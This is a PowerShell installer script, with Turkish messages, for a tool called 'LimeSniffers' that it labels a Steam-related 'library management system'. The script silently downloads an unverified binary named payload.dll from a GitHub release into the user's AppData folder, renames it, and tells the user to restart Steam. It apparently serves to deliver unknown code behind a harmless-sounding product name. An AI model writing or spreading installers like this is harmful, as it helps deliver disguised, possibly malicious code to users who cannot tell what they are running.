# LimeSniffers Installation Script
# Built for SteamTools Infrastructure

$ErrorActionPreference = "Stop"

function Show-Logo {
    Write-Host @"
    
  _      _                _____       _  __  __               
 | |    (_)              / ____|     (_)/ _|/ _|              
 | |     _ _ __ ___   __| (___  _ __  _| |_| |_ ___ _ __ ___ 
 | |    | | '_ ` _ \ / _ \\___ \| '_ \| |  _|  _/ _ \ '__/ __|
 | |____| | | | | | |  __/____) | | | | | | | ||  __/ |  \__ \
 |______|_|_| |_| |_|\___|_____/|_| |_|_|_| |_| \___|_|  |___/
                                                              
    >>> Cloud-Based Library Management System <<<
"@ -ForegroundColor Green
}

Show-Logo

$installPath = "$env:AppData\LimeSniffers"
$dllUrl = "https://github.com/PromaxTheCoderx/LimeTools/releases/download/v1/payload.dll"

try {
    if (!(Test-Path $installPath)) {
        Write-Host "[+] Klasör oluşturuluyor: $installPath" -ForegroundColor Gray
        New-Item -ItemType Directory -Force -Path $installPath | Out-Null
    }

    Write-Host "[*] LimeSniffers DLL indiriliyor..." -ForegroundColor Cyan
    # Not: InfinityFree'den indirirken sorun çıkarsa DLL'i de GitHub'a atmanı öneririm
    Invoke-WebRequest -Uri $dllUrl -OutFile "$installPath\LimeSniffers.dll" -UseBasicParsing

    Write-Host "[+] Kurulum başarıyla tamamlandı!" -ForegroundColor Green
    Write-Host "[!] Lütfen Steam'i yeniden başlatın." -ForegroundColor Yellow
    Write-Host "[?] Sorun yaşarsanız dashboard üzerinden destek alabilirsiniz." -ForegroundColor Gray
}
catch {
    Write-Host "[-] Hata oluştu: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "[!] Lütfen yönetici olarak çalıştırmayı deneyin veya internet bağlantınızı kontrol edin." -ForegroundColor Yellow
}

pause
